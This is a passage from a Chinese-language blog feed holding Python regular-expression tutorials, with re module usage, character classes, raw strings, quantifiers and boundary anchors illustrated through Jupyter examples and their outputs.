返回一个二元组，内容分别是m.start(g)和m.end(g)的返回值</p></li><li><p><font color=#FF0000 size=4>m.re()</font></p><p>  产生这一匹配对象的正则表达式</p></li><li><p><font color=#FF0000 size=4>m.string()</font></p><p>  传递给match或者search用于匹配的字符串</p></li><li><p><font color=#FF0000 size=4>m.pos()</font></p><p>  搜索的起始位置。即字符串的开头，或者start指定的位置(不常用)</p></li><li><p><font color=#FF0000 size=4>m.endpos()</font></p><p>  搜索的结束位置。即字符串的末尾位置，或者end指定的位置(不常用)</p></li></ul><h3 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h3><ul><li>对于正则表达式的匹配功能，Python没有返回true和false的方法，但可以通过对match或者search方法的返回值是否是None来判断</li><li>对于正则表达式的搜索功能，如果只搜索一次可以使用search或者match方法返回的匹配对象得到，对于搜索多次可以使用finditer方法返回的可迭代对象来迭代访问</li><li>对于正则表达式的替换功能，可以使用正则表达式对象的sub或者subn方法来实现，也可以通过re模块方法sub或者subn来实现，区别在于模块的sub方法的替换文本可以使用一个函数来生成</li><li>对于正则表达式的分割功能，可以使用正则表达式对象的split方法，需要注意如果正则表达式对象有分组的话，分组捕获的内容也会放到返回的列表中</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>正则表达式HOWTO <a href="https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto</a></li><li>re-模块操作 <a href="https://docs.python.org/zh-cn/3/library/re.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/re.html</a></li><li>小结参考：<a href="https://www.jianshu.com/p/5295c5988b7f" target="_blank" rel="noopener">https://www.jianshu.com/p/5295c5988b7f</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-正则】1.1Python正则表达式学习-1</title>
      <link href="2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/"/>
      <url>2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习</p><a id="more"></a><h2 id="0x01-正则表达式概述"><a href="#0x01-正则表达式概述" class="headerlink" title="0x01 正则表达式概述"></a>0x01 正则表达式概述</h2><p>正则表达式，又称正规表示式、正规表示法、正规表达式、 规则表达式、 常规表示法（英语：Regular Expression，在代码中常简写为regex、 regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、 匹配一系列匹配某个句法规则的字符串。 在很多⽂本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>Regular Expression的“Regular”⼀般被译为“正则”、 “正规”、 “常规”。 此处的“Regular”即是“规则”、 “规律”的意思， Regular Expression即“描述某种规则的表达式”之意。</p><h2 id="0x02-re模块操作"><a href="#0x02-re模块操作" class="headerlink" title="0x02 re模块操作"></a>0x02 re模块操作</h2><blockquote><p>在Python中需要通过正则表达式对字符串进⾏匹配的时候，可以使⽤⼀个模<br>块，名字为re</p></blockquote><h3 id="2-1-re模块的使用过程"><a href="#2-1-re模块的使用过程" class="headerlink" title="2.1 re模块的使用过程"></a>2.1 re模块的使用过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入re模块</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用match方法进行匹配操作</span></span><br><span class="line">result = re.match(正则表达式，要匹配的字符串)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果上⼀步匹配到数据的话， 可以使⽤group⽅法来提取数据</span></span><br><span class="line">result.group()</span><br></pre></td></tr></table></figure><ul><li><p>re.match是进行正则匹配检查的方法，若字符串匹配正则表达式，则match方法返回匹配对象（Match Object）,否则返回None（注意不是空字符串””）</p></li><li><p>匹配对象Match Object对象具有group方法，用来返回字符串的匹配部分</p></li></ul><h3 id="2-2-re模块示例"><a href="#2-2-re模块示例" class="headerlink" title="2.2 re模块示例"></a>2.2 re模块示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#匹配hello开头的字符串</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">result = re.match(<span class="string">"hello"</span>,<span class="string">"hello world"</span>)</span><br><span class="line"><span class="comment"># 查看Match  object对象</span></span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>Out:&lt;re.Match object; span=(0, 5), match=&apos;hello&apos;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello&apos;</code></pre><h2 id="0x03-表示字符"><a href="#0x03-表示字符" class="headerlink" title="0x03 表示字符"></a>0x03 表示字符</h2><p>正则表达式单字符匹配常用的模式</p><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">.</td><td align="left">匹配任意1个字符（除了\n）</td></tr><tr><td align="center">[]</td><td align="left">匹配[]中列举的字符</td></tr><tr><td align="center">\d</td><td align="left">匹配数字，即0-9</td></tr><tr><td align="center">\D</td><td align="left">匹配非数字，即不是数字</td></tr><tr><td align="center">\s</td><td align="left">匹配空白，即空格、tab键</td></tr><tr><td align="center">\S</td><td align="left">匹配非空白</td></tr><tr><td align="center">\w</td><td align="left">匹配单词字符，即a-z、A-Z、0-9、_</td></tr><tr><td align="center">\W</td><td align="left">匹配非单词字符</td></tr></tbody></table><h3 id="3-1-示例1："><a href="#3-1-示例1：" class="headerlink" title="3.1 示例1：."></a>3.1 示例1：.</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret1 = re.match(<span class="string">"."</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;a&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret2 = re.match(<span class="string">"."</span>,<span class="string">"bca"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;b&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret3 = re.match(<span class="string">"."</span>,<span class="string">"@18"</span>)</span><br><span class="line">ret3.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;@&apos;</code></pre><h3 id="3-2-示例2："><a href="#3-2-示例2：" class="headerlink" title="3.2 示例2：[]"></a>3.2 示例2：[]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果hello的首字符⼩写， 那么正则表达式需要⼩写的h</span></span><br><span class="line">ret1 = re.match(<span class="string">"h"</span>,<span class="string">"hello Python"</span>)</span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;h&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果hello的首字符大写，则正则表达式则需要大写的H</span></span><br><span class="line">ret2 = re.match(<span class="string">"H"</span>,<span class="string">"Hello Python"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;H&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写都可以</span></span><br><span class="line">ret3 = re.match(<span class="string">"[hH]"</span>,<span class="string">"hello Python"</span>)</span><br><span class="line">ret3.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;h&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret4 = re.match(<span class="string">"[hH]"</span>,<span class="string">"Hello Python"</span>)</span><br><span class="line">ret4.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;H&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配0-9第一种写法</span></span><br><span class="line">ret5 = re.match(<span class="string">"[0123456789]"</span>,<span class="string">"7Hello"</span>)</span><br><span class="line">ret5.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配0-9第二种写法</span></span><br><span class="line">ret6= re.match(<span class="string">"[0-9]"</span>,<span class="string">"7Hello"</span>)</span><br><span class="line">ret6.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><h3 id="3-3-示例3：-d"><a href="#3-3-示例3：-d" class="headerlink" title="3.3 示例3：\d"></a>3.3 示例3：\d</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通匹配</span></span><br><span class="line">ret1 = re.match(<span class="string">"hello2"</span>,<span class="string">"hello2world"</span>)</span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello2&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用\d匹配</span></span><br><span class="line">ret2 = re.match(<span class="string">"hello\d"</span>,<span class="string">"hello2world"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello2&apos;</code></pre><h2 id="0x04-原始字符串"><a href="#0x04-原始字符串" class="headerlink" title="0x04 原始字符串"></a>0x04 原始字符串</h2><h3 id="4-1-各种示例"><a href="#4-1-各种示例" class="headerlink" title="4. 1 各种示例"></a>4. 1 各种示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如：想打印出\n,一个反斜杠时，当作换行符进行打印</span></span><br><span class="line">s= <span class="string">"\ndd"</span></span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><pre><code>打印：dd</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"\\ndd"</span></span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><pre><code>打印：\ndd</code></pre><ul><li>mm = “c:\a\b\c”</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mm= <span class="string">"c:\\a\\b\\c"</span></span><br><span class="line">mm</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;c:\\a\\b\\c&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(mm)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a\b\c</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里匹配需四个反斜杠，方能匹配字符串中两个反斜杠</span></span><br><span class="line">re.match(<span class="string">"c:\\\\"</span>,mm).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;c:\\&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"c:\\\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用r</span></span><br><span class="line">ret =re.match(<span class="string">r"c:\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">r"c:\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-45-1a051863b698&gt; in &lt;module&gt;----&gt; 1 ret = re.match(r&quot;c:\a&quot;,mm).group()      2 print(ret)AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="4-2-示例说明"><a href="#4-2-示例说明" class="headerlink" title="4.2 示例说明"></a>4.2 示例说明</h3><p>Python字符串前面加上<strong>r</strong> 表示原生字符串</p><p>与大多数编程语言相同，正则表达式里使用”\n”作为转义字符，这就可能造成反斜杠困扰。加入匹配文本中的字符串”\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠“\\”：前两个和后两个分别用于在编程语言里转义反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠</p><p>Python里的原生字符串很好的解决了这个问题，不再担心漏写反斜杠，写出的表达式更直观</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mm= <span class="string">"c:\\a\\b\\c"</span></span><br><span class="line">ret = re.match(<span class="string">r"c:\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><h2 id="0x05-表示数量"><a href="#0x05-表示数量" class="headerlink" title="0x05 表示数量"></a>0x05 表示数量</h2><p>匹配多个字符的相关格式</p><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">*</td><td align="left">匹配前一个字符出现0次或者无限次，即可有可无</td></tr><tr><td align="center">+</td><td align="left">匹配前一个字符出现1次或者无限次，即至少有1次</td></tr><tr><td align="center">?</td><td align="left">匹配前一个字符出现1次或者0次, 即要么有1次，要么没有</td></tr><tr><td align="center">{m}</td><td align="left">匹配前一个字符出现m次</td></tr><tr><td align="center">{m,}</td><td align="left">匹配前一个字符至少出现m次</td></tr><tr><td align="center">{m,n}</td><td align="left">匹配前一个字符出现从m到n次</td></tr></tbody></table><h3 id="5-1-示例1："><a href="#5-1-示例1：" class="headerlink" title="5.1 示例1：*"></a>5.1 示例1：*</h3><p>需求：匹配出，一个字符串第一个字母为大写字符，后面都是小写字母并且这些小写字母可有可无</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"Mm"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;Mm&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *前无匹配字符时是可以的</span></span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"M"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;M&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *前字符的匹配有连续多个</span></span><br><span class="line">ret = re.match(<span class="string">"[A-Z][a-z]*"</span>,<span class="string">"Mabcdef"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;Mabcdef&apos;</code></pre><h3 id="5-2-示例2："><a href="#5-2-示例2：" class="headerlink" title="5.2 示例2：+"></a>5.2 示例2：+</h3><p>需求：匹配出，变量名是否有效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [a-zA-Z]+表示与[a-zA-Z]至少匹配成功一个字母，[\w]* 表示*前字符可有0个或多个</span></span><br><span class="line">ret = re.match(<span class="string">"[a-zA-Z]+[\w]*"</span>,<span class="string">"name1"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;name1&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z_]+[\w]*"</span>,<span class="string">"_name"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;_name&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z_]+[\w]*"</span>,<span class="string">"2_name"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>打印:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-65-572ee7f143b4&gt; in &lt;module&gt;      1 ret = re.match(&quot;[a-zA-Z_]+[\w]*&quot;,&quot;2_name&quot;)----&gt; 2 ret.group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="5-3-示例3：？"><a href="#5-3-示例3：？" class="headerlink" title="5.3 示例3：？"></a>5.3 示例3：？</h3><p>需求：匹配出，0-99之间的数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"7"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"33"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;33&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 结果原因：第一个数字[1-9]未匹配到，？出现0次或1次；所以后一个[0-9]匹配了0</span></span><br><span class="line">ret =re.match(<span class="string">"[1-9]?[0-9]"</span>,<span class="string">"09"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;0&apos;</code></pre><h3 id="5-4-示例4：-m"><a href="#5-4-示例4：-m" class="headerlink" title="5.4 示例4：{m}"></a>5.4 示例4：{m}</h3><p>需求：匹配出，8-20位的密码，可以大小写英文字母、数字、下划线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ret =re.match(<span class="string">"[a-zA-Z0-9_]&#123;6&#125;"</span>,<span class="string">"12a3g45678"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;12a3g4&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"[a-zA-Z0-9_]&#123;8,20&#125;"</span>,<span class="string">"1ad12fffs39d739473920_d398sd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;1ad12fffs39d73947392&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [\w]==[a-zA-Z0-9_]，当然其他也有各自的等价表示方法</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;8,20&#125;"</span>,<span class="string">"1ad12fffs39d739473920_d398sd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;1ad12fffs39d73947392&apos;</code></pre><ul><li>简单练习，匹配出163的邮箱地址，且@符号之前有4-20位，例如<code>hello@163.com</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单练习，匹配163邮箱地址(不完善)</span></span><br><span class="line">ret =re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"hell0@163.com"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hell0@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思考如何匹配以。。。结尾</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"hello@163.comddddd"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello@163.com&apos;</code></pre><h2 id="0x06-表示边界"><a href="#0x06-表示边界" class="headerlink" title="0x06 表示边界"></a>0x06 表示边界</h2><table><thead><tr><th align="left">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配字符串开头</td></tr><tr><td align="left">$</td><td align="left">匹配字符串结尾</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词的边界</td></tr><tr><td align="left">\B</td><td align="left">匹配非单词边界</td></tr></tbody></table><h3 id="6-1-示例1："><a href="#6-1-示例1：" class="headerlink" title="6.1 示例1：$"></a>6.1 示例1：$</h3><p>需求：匹配163.com的邮箱地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"xiaoWang@163.com"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;xiaoWang@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不正确的地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com"</span>,<span class="string">"xiaoWang@163.comheihhh"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;xiaowang@163.com&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过$来确定末尾,从而过滤不正确地址</span></span><br><span class="line">ret = re.match(<span class="string">"[\w]&#123;4,20&#125;@163\.com$"</span>,<span class="string">"xiaoWang@163.comheihhh"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>打印：---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-93-83efc35bff7d&gt; in &lt;module&gt;      1 # 通过$来确定末尾      2 ret = re.match(&quot;[\w]{4,20}@163\.com$&quot;,&quot;xiaoWang@163.comheihhh&quot;)----&gt; 3 ret.group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="6-2-示例2：-b"><a href="#6-2-示例2：-b" class="headerlink" title="6.2 示例2：\b"></a>6.2 示例2：\b</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"ho ver abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;ho ver&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当单词右边没有边界时，使用\b出错</span></span><br><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"ho verabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-95-d65bbce81439&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\bver\b&quot;,&quot;ho verabc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定单词左边无边界时，也出错</span></span><br><span class="line">re.match(<span class="string">r".*\bver\b"</span>,<span class="string">"hover abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-96-53f69a15373e&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\bver\b&quot;,&quot;hover abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="6-3-示例3：-B"><a href="#6-3-示例3：-B" class="headerlink" title="6.3 示例3：\B"></a>6.3 示例3：\B</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"hoverabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hover&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定词有左边界时，出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"ho verabc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-98-a9d342249fa1&gt; in &lt;module&gt;      1 # 当指定词有左边界时，出错----&gt; 2 re.match(r&quot;.*\Bver\B&quot;,&quot;ho verabc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定的词，有右边界时，\B出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"hover abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-99-aae06b891466&gt; in &lt;module&gt;----&gt; 1 re.match(r&quot;.*\Bver\B&quot;,&quot;hover abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当指定的词，左右都有边界时，\B出错</span></span><br><span class="line">re.match(<span class="string">r".*\Bver\B"</span>,<span class="string">"ho ver abc"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>Out:---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-101-9630adaf466f&gt; in &lt;module&gt;      1 # 当指定的词，左右都有边界时，\B出错----&gt; 2 re.match(r&quot;.*\Bver\B&quot;,&quot;ho ver abc&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h2 id="0x07-匹配分组"><a href="#0x07-匹配分组" class="headerlink" title="0x07 匹配分组"></a>0x07 匹配分组</h2><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center"></td><td align="left"></td></tr><tr><td 